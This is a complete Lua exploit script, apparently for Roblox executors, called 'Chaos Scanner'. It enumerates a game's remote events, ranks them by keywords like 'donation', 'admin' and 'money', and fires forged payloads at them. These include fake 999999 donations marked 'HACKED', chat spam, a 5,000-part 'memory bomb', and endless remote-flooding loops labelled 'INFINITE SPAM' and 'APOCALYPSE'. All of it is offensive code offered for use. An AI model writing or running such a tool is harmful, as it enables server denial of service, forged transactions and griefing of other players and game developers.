-- CHAOS SCANNER V1.1 - ULTRA COMPATIBLE
-- Simple version that works on ALL executors

print("Loading Chaos Scanner...")

-- Basic wait function
local function safewait(t)
    local start = tick()
    repeat until tick() - start >= (t or 0.1)
end

-- Load services safely
local Players, RS, WS, CG, UIS, Player, PG

pcall(function()
    Players = game:FindFirstChildOfClass("Players") or game.Players
    RS = game:FindFirstChildOfClass("ReplicatedStorage") or game.ReplicatedStorage
    WS = game:FindFirstChildOfClass("Workspace") or game.Workspace
    CG = gethui and gethui() or game.CoreGui
    UIS = game:GetService("UserInputService")
end)

-- Wait for player
repeat safewait(0.1) until Players and Players.LocalPlayer
Player = Players.LocalPlayer

repeat safewait(0.1) until Player.Character
PG = Player:FindFirstChildOfClass("PlayerGui") or Player.PlayerGui

print("[CHAOS] Services loaded!")

-- Config
local Config = {
    ScanDelay = 0.1,
    AutoScan = true,
    Theme = {
        Primary = Color3.fromRGB(138, 43, 226),
        Secondary = Color3.fromRGB(75, 0, 130),
        Success = Color3.fromRGB(46, 204, 113),
        Warning = Color3.fromRGB(241, 196, 15),
        Danger = Color3.fromRGB(231, 76, 60),
        Background = Color3.fromRGB(23, 23, 23),
        Text = Color3.fromRGB(255, 255, 255)
    }
}

-- Scanner
local Scanner = {
    Results = {RemoteEvents = {}, Objects = {}, GUIs = {}},
    Stats = {TotalScanned = 0, HighRisk = 0, MediumRisk = 0, LowRisk = 0}
}

function Scanner:ScanRemoteEvents()
    local remotes = {}
    local function scanContainer(container)
        for _, obj in pairs(container:GetDescendants()) do
            if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
                local risk = self:AnalyzeRemote(obj)
                table.insert(remotes, {
                    Object = obj,
                    Path = obj:GetFullName(),
                    Type = obj.ClassName,
                    Risk = risk,
                    Name = obj.Name
                })
                self.Stats.TotalScanned = self.Stats.TotalScanned + 1
                if risk == "High" then self.Stats.HighRisk = self.Stats.HighRisk + 1
                elseif risk == "Medium" then self.Stats.MediumRisk = self.Stats.MediumRisk + 1
                else self.Stats.LowRisk = self.Stats.LowRisk + 1 end
            end
        end
    end
    pcall(function() scanContainer(RS) end)
    pcall(function() scanContainer(WS) end)
    self.Results.RemoteEvents = remotes
    return remotes
end

function Scanner:AnalyzeRemote(remote)
    local name = remote.Name:lower()
    local highRisk = {"donation", "tip", "admin", "mod", "owner", "purchase", "buy", "vip", "gamepass", "money", "cash", "coin"}
    for _, keyword in pairs(highRisk) do
        if name:find(keyword) then return "High" end
    end
    local mediumRisk = {"chat", "message", "teleport", "tp", "spawn", "give", "award", "unlock"}
    for _, keyword in pairs(mediumRisk) do
        if name:find(keyword) then return "Medium" end
    end
    return "Low"
end

function Scanner:ScanObjects()
    local objects = {}
    for _, obj in pairs(WS:GetDescendants()) do
        if obj:IsA("BasePart") and not obj.Anchored then
            local name = obj.Name:lower()
            local risk = "Low"
            if name:find("stair") or name:find("ladder") or name:find("door") or name:find("platform") then
                risk = "Medium"
            end
            table.insert(objects, {Object = obj, Name = obj.Name, Type = obj.ClassName, Risk = risk, Movable = true})
        end
    end
    self.Results.Objects = objects
    return objects
end

function Scanner:FullScan()
    print("[CHAOS] Scanning...")
    self:ScanRemoteEvents()
    self:ScanObjects()
    print("[CHAOS] Scan complete!")
    return self.Results
end

-- Executor
local Executor = {Active = {}, Logs = {}}

function Executor:FireRemote(remote, ...)
    local success = pcall(function()
        if remote.Type == "RemoteEvent" then
            remote.Object:FireServer(...)
        elseif remote.Type == "RemoteFunction" then
            remote.Object:InvokeServer(...)
        end
    end)
    return success
end

function Executor:FakeDonation(remote, amount, message)
    local variants = {
        {amount = amount or 999999, from = Player.Name, message = message or "HACKED"},
        {Amount = amount or 999999, From = Player.Name, Message = message or "HACKED"},
        {value = amount or 999999, player = Player.Name, text = message or "HACKED"}
    }
    for _, data in pairs(variants) do
        self:FireRemote(remote, data)
        safewait(0.1)
    end
end

function Executor:SpamChat(remote, message, count)
    for i = 1, count or 10 do
        self:FireRemote(remote, message or "CHAOS")
        safewait(0.1)
    end
end

function Executor:MoveObject(object, position)
    pcall(function()
        if object:IsA("BasePart") then
            object.CFrame = CFrame.new(position or Vector3.new(0, 1000, 0))
        elseif object:IsA("Model") and object.PrimaryPart then
            object:SetPrimaryPartCFrame(CFrame.new(position or Vector3.new(0, 1000, 0)))
        end
    end)
end

function Executor:ChaosMode()
    for _, remote in pairs(Scanner.Results.RemoteEvents) do
        if remote.Risk == "High" then
            spawn(function()
                for i = 1, 5 do
                    self:FireRemote(remote, {chaos = true, value = 999999})
                    safewait(0.5)
                end
            end)
        end
    end
    for _, obj in pairs(Scanner.Results.Objects) do
        if obj.Movable then
            spawn(function()
                self:MoveObject(obj.Object, Vector3.new(math.random(-500, 500), 1000, math.random(-500, 500)))
            end)
        end
    end
end

function Executor:MemoryBomb()
    print("[MEMORY BOMB] Spawning 5000 objects...")
    for i = 1, 5000 do
        spawn(function()
            pcall(function()
                local part = Instance.new("Part")
                part.Size = Vector3.new(math.random(10, 100), math.random(10, 100), math.random(10, 100))
                part.Position = Vector3.new(math.random(-2000, 2000), math.random(0, 2000), math.random(-2000, 2000))
                part.Anchored = false
                part.Material = Enum.Material.Neon
                part.BrickColor = BrickColor.Random()
                part.Parent = WS
            end)
        end)
        if i % 100 == 0 then safewait(0.1) end
    end
end

function Executor:InfiniteSpam()
    print("[INFINITE SPAM] Starting...")
    for i = 1, 100 do
        spawn(function()
            while true do
                for _, remote in pairs(Scanner.Results.RemoteEvents) do
                    pcall(function()
                        self:FireRemote(remote, {spam = true, data = string.rep("SPAM", 1000)})
                    end)
                end
                safewait(0.001)
            end
        end)
    end
end

function Executor:ApocalypseMode()
    print("[APOCALYPSE] Starting...")
    for i = 1, 50 do
        spawn(function()
            while safewait(0.01) do
                for _, remote in pairs(Scanner.Results.RemoteEvents) do
                    pcall(function() self:FireRemote(remote, {apocalypse = true, data = string.rep("X", 10000)}) end)
                end
            end
        end)
    end
    spawn(function()
        for i = 1, 1000 do
            pcall(function()
                local part = Instance.new("Part")
                part.Size = Vector3.new(50, 50, 50)
                part.Position = Vector3.new(math.random(-1000, 1000), 500, math.random(-1000, 1000))
                part.Anchored = false
                part.Parent = WS
            end)
            safewait(0.01)
        end
    end)
end

-- UI
local UI = {}

function UI:Create()
    local SG = Instance.new("ScreenGui")
    SG.Name = "ChaosScanner"
    SG.ResetOnSpawn = false
    SG.Parent = CG
    
    local MF = Instance.new("Frame")
    MF.Size = UDim2.new(0, 600, 0, 500)
    MF.Position = UDim2.new(0.5, -300, 0.5, -250)
    MF.BackgroundColor3 = Config.Theme.Background
    MF.BorderSizePixel = 0
    MF.Parent = SG
    
    local Corner = Instance.new("UICorner")
    Corner.CornerRadius = UDim.new(0, 12)
    Corner.Parent = MF
    
    local Header = Instance.new("Frame")
    Header.Size = UDim2.new(1, 0, 0, 60)
    Header.BackgroundColor3 = Config.Theme.Primary
    Header.BorderSizePixel = 0
    Header.Parent = MF
    
    local HCorner = Instance.new("UICorner")
    HCorner.CornerRadius = UDim.new(0, 12)
    HCorner.Parent = Header
    
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(0, 200, 1, 0)
    Title.Position = UDim2.new(0, 10, 0, 0)
    Title.BackgroundTransparency = 1
    Title.Text = "CHAOS SCANNER"
    Title.TextColor3 = Config.Theme.Text
    Title.TextSize = 20
    Title.Font = Enum.Font.GothamBold
    Title.TextXAlignment = Enum.TextXAlignment.Left
    Title.Parent = Header
    
    local CloseBtn = Instance.new("TextButton")
    CloseBtn.Size = UDim2.new(0, 40, 0, 40)
    CloseBtn.Position = UDim2.new(1, -50, 0.5, -20)
    CloseBtn.BackgroundColor3 = Config.Theme.Danger
    CloseBtn.Text = "X"
    CloseBtn.TextColor3 = Config.Theme.Text
    CloseBtn.TextSize = 20
    CloseBtn.Font = Enum.Font.GothamBold
    CloseBtn.Parent = Header
    CloseBtn.MouseButton1Click:Connect(function() SG:Destroy() end)
    
    local CCorner = Instance.new("UICorner")
    CCorner.CornerRadius = UDim.new(0, 8)
    CCorner.Parent = CloseBtn
    
    local StatsFrame = Instance.new("Frame")
    StatsFrame.Size = UDim2.new(1, -20, 0, 80)
    StatsFrame.Position = UDim2.new(0, 10, 0, 70)
    StatsFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    StatsFrame.BorderSizePixel = 0
    StatsFrame.Parent = MF
    
    local SCorner = Instance.new("UICorner")
    SCorner.CornerRadius = UDim.new(0, 8)
    SCorner.Parent = StatsFrame
    
    local function createStat(name, color, pos)
        local L = Instance.new("TextLabel")
        L.Size = UDim2.new(0.25, -10, 1, 0)
        L.Position = pos
        L.BackgroundTransparency = 1
        L.Text = "0"
        L.TextColor3 = color
        L.TextSize = 24
        L.Font = Enum.Font.GothamBold
        L.Parent = StatsFrame
        local N = Instance.new("TextLabel")
        N.Size = UDim2.new(1, 0, 0, 20)
        N.Position = UDim2.new(0, 0, 1, -25)
        N.BackgroundTransparency = 1
        N.Text = name
        N.TextColor3 = Color3.fromRGB(150, 150, 150)
        N.TextSize = 12
        N.Font = Enum.Font.Gotham
        N.Parent = L
        return L
    end
    
    local TotalStat = createStat("TOTAL", Config.Theme.Text, UDim2.new(0, 5, 0, 10))
    local HighStat = createStat("HIGH", Config.Theme.Danger, UDim2.new(0.25, 5, 0, 10))
    local MediumStat = createStat("MEDIUM", Config.Theme.Warning, UDim2.new(0.5, 5, 0, 10))
    local LowStat = createStat("LOW", Config.Theme.Success, UDim2.new(0.75, 5, 0, 10))
    
    local ContentFrame = Instance.new("ScrollingFrame")
    ContentFrame.Size = UDim2.new(1, -20, 0, 250)
    ContentFrame.Position = UDim2.new(0, 10, 0, 160)
    ContentFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    ContentFrame.BorderSizePixel = 0
    ContentFrame.ScrollBarThickness = 6
    ContentFrame.Parent = MF
    
    local CntCorner = Instance.new("UICorner")
    CntCorner.CornerRadius = UDim.new(0, 8)
    CntCorner.Parent = ContentFrame
    
    local ContentList = Instance.new("UIListLayout")
    ContentList.Padding = UDim.new(0, 5)
    ContentList.Parent = ContentFrame
    
    local function createButton(text, color, pos, callback)
        local B = Instance.new("TextButton")
        B.Size = UDim2.new(0.32, -5, 1, 0)
        B.Position = pos
        B.BackgroundColor3 = color
        B.Text = text
        B.TextColor3 = Config.Theme.Text
        B.TextSize = 12
        B.Font = Enum.Font.GothamBold
        B.Parent = MF
        local BC = Instance.new("UICorner")
        BC.CornerRadius = UDim.new(0, 8)
        BC.Parent = B
        B.MouseButton1Click:Connect(callback)
        return B
    end
    
    local ScanBtn = createButton("SCAN", Config.Theme.Primary, UDim2.new(0, 10, 1, -95), function()
        ContentFrame:ClearAllChildren()
        ContentList.Parent = ContentFrame
        Scanner:FullScan()
        TotalStat.Text = tostring(Scanner.Stats.TotalScanned)
        HighStat.Text = tostring(Scanner.Stats.HighRisk)
        MediumStat.Text = tostring(Scanner.Stats.MediumRisk)
        LowStat.Text = tostring(Scanner.Stats.LowRisk)
        UI:DisplayResults(ContentFrame)
    end)
    
    local ExploitBtn = createButton("EXPLOIT", Config.Theme.Warning, UDim2.new(0.34, 10, 1, -95), function()
        for _, remote in pairs(Scanner.Results.RemoteEvents) do
            if remote.Risk == "High" then Executor:FireRemote(remote, {chaos = true}) end
        end
    end)
    
    local ChaosBtn = createButton("CHAOS", Config.Theme.Danger, UDim2.new(0.68, 10, 1, -95), function()
        Executor:ChaosMode()
    end)
    
    local MemoryBtn = createButton("MEMORY", Color3.fromRGB(139, 0, 0), UDim2.new(0, 10, 1, -50), function()
        Executor:MemoryBomb()
    end)
    
    local SpamBtn = createButton("SPAM", Color3.fromRGB(128, 0, 128), UDim2.new(0.34, 10, 1, -50), function()
        Executor:InfiniteSpam()
    end)
    
    local ApocBtn = createButton("APOCALYPSE", Color3.fromRGB(0, 0, 0), UDim2.new(0.68, 10, 1, -50), function()
        Executor:ApocalypseMode()
    end)
    
    return SG
end

function UI:DisplayResults(container)
    for _, remote in pairs(Scanner.Results.RemoteEvents) do
        local Item = Instance.new("Frame")
        Item.Size = UDim2.new(1, -10, 0, 50)
        Item.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        Item.BorderSizePixel = 0
        Item.Parent = container
        
        local IC = Instance.new("UICorner")
        IC.CornerRadius = UDim.new(0, 6)
        IC.Parent = Item
        
        local NameLabel = Instance.new("TextLabel")
        NameLabel.Size = UDim2.new(0.6, -15, 0, 20)
        NameLabel.Position = UDim2.new(0, 10, 0, 5)
        NameLabel.BackgroundTransparency = 1
        NameLabel.Text = remote.Name
        NameLabel.TextColor3 = Config.Theme.Text
        NameLabel.TextSize = 12
        NameLabel.Font = Enum.Font.GothamBold
        NameLabel.TextXAlignment = Enum.TextXAlignment.Left
        NameLabel.Parent = Item
        
        local TypeLabel = Instance.new("TextLabel")
        TypeLabel.Size = UDim2.new(0.6, -15, 0, 15)
        TypeLabel.Position = UDim2.new(0, 10, 0, 25)
        TypeLabel.BackgroundTransparency = 1
        TypeLabel.Text = remote.Type .. " | " .. remote.Risk
        TypeLabel.TextColor3 = Color3.fromRGB(150, 150, 150)
        TypeLabel.TextSize = 10
        TypeLabel.Font = Enum.Font.Gotham
        TypeLabel.TextXAlignment = Enum.TextXAlignment.Left
        TypeLabel.Parent = Item
        
        local ExecBtn = Instance.new("TextButton")
        ExecBtn.Size = UDim2.new(0, 70, 0, 25)
        ExecBtn.Position = UDim2.new(1, -80, 0.5, -12)
        ExecBtn.BackgroundColor3 = Config.Theme.Primary
        ExecBtn.Text = "EXEC"
        ExecBtn.TextColor3 = Config.Theme.Text
        ExecBtn.TextSize = 10
        ExecBtn.Font = Enum.Font.GothamBold
        ExecBtn.Parent = Item
        
        local EC = Instance.new("UICorner")
        EC.CornerRadius = UDim.new(0, 6)
        EC.Parent = ExecBtn
        
        ExecBtn.MouseButton1Click:Connect(function()
            if remote.Name:lower():find("donation") or remote.Name:lower():find("tip") then
                Executor:FakeDonation(remote, 999999, "CHAOS")
            elseif remote.Name:lower():find("chat") then
                Executor:SpamChat(remote, "CHAOS", 5)
            else
                Executor:FireRemote(remote, {chaos = true})
            end
            ExecBtn.Text = "DONE"
            ExecBtn.BackgroundColor3 = Config.Theme.Success
            safewait(1)
            ExecBtn.Text = "EXEC"
            ExecBtn.BackgroundColor3 = Config.Theme.Primary
        end)
    end
    container.CanvasSize = UDim2.new(0, 0, 0, ContentList.AbsoluteContentSize.Y + 10)
end

-- Init
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
print("  CHAOS SCANNER V1.1 - ULTRA COMPATIBLE")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")

local MainUI = UI:Create()

if Config.AutoScan then
    safewait(1)
    print("[CHAOS] Auto scanning...")
    Scanner:FullScan()
    print("[CHAOS] Found " .. Scanner.Stats.TotalScanned .. " remotes")
    print("[CHAOS] High: " .. Scanner.Stats.HighRisk .. " | Medium: " .. Scanner.Stats.MediumRisk .. " | Low: " .. Scanner.Stats.LowRisk)
end

print("[CHAOS] Ready! Click SCAN button.")
print("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
